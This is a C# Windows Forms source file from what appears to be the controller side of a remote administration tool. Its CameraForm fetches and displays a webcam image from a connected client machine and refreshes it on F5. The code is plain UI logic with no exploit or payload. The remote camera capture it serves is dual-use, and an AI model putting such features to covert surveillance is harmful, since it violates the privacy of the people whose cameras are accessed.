using Common.Frames;
using Common.Frames.Screenshot;
using Common.Server.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class CameraForm : Form
    {
        private ClientData Client { get; }

        private CameraForm()
        {
            InitializeComponent();
        }

        public CameraForm(ClientData client)
            : this()
        {
            Client = client;
        }

        private async Task UpdateCamera()
        {
            try
            {
                using (CameraHelper helper = new CameraHelper(Client))
                {
                    pictureBox1.Image = new Bitmap(new MemoryStream(await helper.StartAsync()));
                }
            }
            catch (Exception ex)
            {
                if (!this.IsDisposed) MessageBox.Show(ex.Message);
            }
        }

        private async void CameraForm_Load(object sender, EventArgs e)
        {
            await UpdateCamera();
        }

        private void CameraForm_SizeChanged(object sender, EventArgs e)
        {
            pictureBox1.Width = this.Width - 40;
            pictureBox1.Height = this.Height - 63;
        }

        private async void CameraForm_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.F5:
                    {
                        await UpdateCamera();
                    }
                    break;
            }
        }
    }
}
